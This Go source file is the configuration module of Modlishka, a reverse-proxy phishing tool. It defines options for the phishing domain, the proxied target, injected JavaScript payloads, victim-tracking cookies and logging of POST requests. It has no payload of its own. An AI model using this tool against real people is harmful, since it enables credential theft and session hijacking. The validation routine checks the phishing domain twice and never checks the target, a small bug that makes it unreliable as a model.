/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package config

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"github.com/drk1wi/Modlishka/log"
	"io/ioutil"
	"os"
)

type Options struct {
	PhishingDomain       *string `json:"phishingDomain"`
	ListeningPort        *string `json:"listeningPort"`
	ListeningAddress     *string `json:"listeningAddress"`
	Target               *string `json:"target"`
	TargetRes            *string `json:"targetResources"`
	TargetRules          *string `json:"targetRules"`
	JsRules              *string `json:"jsRules"`
	TerminateTriggers    *string `json:"terminateTriggers"`
	TerminateRedirectUrl *string `json:"terminateRedirectUrl"`
	TrackingCookie       *string `json:"trackingCookie"`
	TrackingParam        *string `json:"trackingParam"`
	ForceHttps           *bool   `json:"forceHttps"`
	UseTls               *bool   `json:"useTls"`
	Debug                *bool   `json:"debug"`
	LogPostOnly          *bool   `json:"logPostOnly"`
	DisableSecurity      *bool   `json:"disableSecurity"`
	LogFile              *string `json:"log"`
	Plugins              *string `json:"plugins"`
	*TLSConfig
}

type TLSConfig struct {
	TLSCertificate *string `json:"cert"`
	TLSKey         *string `json:"certKey"`
	TLSPool        *string `json:"certPool"`
}

var (
	C = Options{
		PhishingDomain:   flag.String("phishingDomain", "", "Phishing domain to create - Ex.: target.co"),
		ListeningPort:    flag.String("listeningPort", "443", "Listening port"),
		ListeningAddress: flag.String("listeningAddress", "127.0.0.1", "Listening address"),
		Target:           flag.String("target", "", "Main target to proxy - Ex.: https://target.com"),
		TargetRes: flag.String("targetRes", "",
			"Comma separated list of target subdomains that need to pass through the reverse proxy - example: static.target.com"),
		TerminateTriggers: flag.String("terminateTriggers", "",
			"Comma separated list of URLs from target's origin which will trigger session termination"),
		TerminateRedirectUrl: flag.String("terminateUrl", "",
			"URL to redirect the client after session termination triggers"),
		TargetRules: flag.String("rules", "",
			"Comma separated list of 'string' patterns and their replacements. Example base64(new):base64(old),"+
				"base64(newer):base64(older)"),
		JsRules: flag.String("jsRules", "", "Comma separated list of URL patterns and JS base64 encoded payloads that will be injected. Example google.com:base64(alert(1)),..,etc"),

		TrackingCookie: flag.String("trackingCookie", "id", "Name of the HTTP cookie used to track the victim"),
		TrackingParam:  flag.String("trackingParam", "id", "Name of the HTTP parameter used to track the victim"),

		UseTls:          flag.Bool("tls", false, "Enable TLS"),
		ForceHttps:      flag.Bool("forceHttps", false, "Force convert links from http to https"),
		Debug:           flag.Bool("debug", false, "Print debug information"),
		DisableSecurity: flag.Bool("disableSecurity", false, "Disable security features like anti-SSRF. Disable at your own risk."),

		LogPostOnly: flag.Bool("postOnly", false, "Log only HTTP POST requests"),
		LogFile:     flag.String("log", "", "Local file to which fetched requests will be written (appended)"),

		Plugins: flag.String("plugins", "all", "Comma separated list of enabled plugin names"),
	}

	s = TLSConfig{
		TLSCertificate: flag.String("cert", "", "base64 encoded TLS certificate"),
		TLSKey:         flag.String("certKey", "", "base64 encoded TLS certificate key"),
		TLSPool:        flag.String("certPool", "", "base64 encoded Certification Authority certificate"),
	}

	JSONConfig = flag.String("config", "", "JSON configuration file. Convenient instead of using command line switches.")
)

func ParseConfiguration() Options {

	flag.Parse()

	// Parse JSON for config
	if len(*JSONConfig) > 0 {
		C.parseJSON(*JSONConfig)
	}

	// Process TLS configuration
	C.TLSConfig = &s

	// we can assume that if someone specified one of the following cmd line parameters then he should define all of them.
	if len(*s.TLSCertificate) > 0 || len(*s.TLSKey) > 0 || len(*s.TLSPool) > 0 {

		// Handle TLS Certificates
		if *C.UseTls {
			if len(*C.TLSCertificate) > 0 {
				decodedCertificate, err := base64.StdEncoding.DecodeString(*C.TLSCertificate)
				if err == nil {
					*C.TLSCertificate = string(decodedCertificate)

				}

			}

			if len(*C.TLSKey) > 0 {
				decodedCertificateKey, err := base64.StdEncoding.DecodeString(*C.TLSKey)
				if err == nil {
					*C.TLSKey = string(decodedCertificateKey)
				}
			}

			if len(*C.TLSPool) > 0 {
				decodedCertificatePool, err := base64.StdEncoding.DecodeString(*C.TLSPool)
				if err == nil {
					*C.TLSPool = string(decodedCertificatePool)
				}
			}
		}

	}

	return C
}

func (c *Options) parseJSON(file string) {

	ct, err := os.Open(file)
	defer ct.Close()
	if err != nil {
		log.Fatalf("Error opening JSON configuration (%s): %s . Terminating.", file, err)
	}

	ctb, _ := ioutil.ReadAll(ct)
	err = json.Unmarshal(ctb, &c)
	if err != nil {
		log.Fatalf("Error unmarshalling JSON configuration (%s): %s . Terminating.", file, err)
	}

	err = json.Unmarshal(ctb, &s)
	if err != nil {
		log.Fatalf("Error unmarshalling JSON configuration (%s): %s . Terminating.", file, err)
	}

	C.TLSConfig = &s

}

func (c *Options) VerifyConfiguration() {

	if *c.UseTls == false {

		if len(*c.PhishingDomain) == 0 || len(*c.PhishingDomain) == 0 {
			log.Warningf("Missing required configuration to start the proxy . Terminating.")
			log.Warningf("TIP: You will need to specify at least the following parameters to serve the page over HTTP: phishing and target.")
			flag.PrintDefaults()
			os.Exit(1)
		}
	}

	if *c.UseTls == true {
		if len(*c.PhishingDomain) == 0 || len(*c.PhishingDomain) == 0 || c.TLSCertificate == nil || c.TLSKey == nil {
			log.Warningf("Missing required configuration to start the proxy . Terminating.")
			log.Warningf("Tip: You will need to specify at least the following parameters to serve the page over HTTPS : phishing, target, cert and certKey.")
			flag.PrintDefaults()
			os.Exit(1)
		}
	}

}
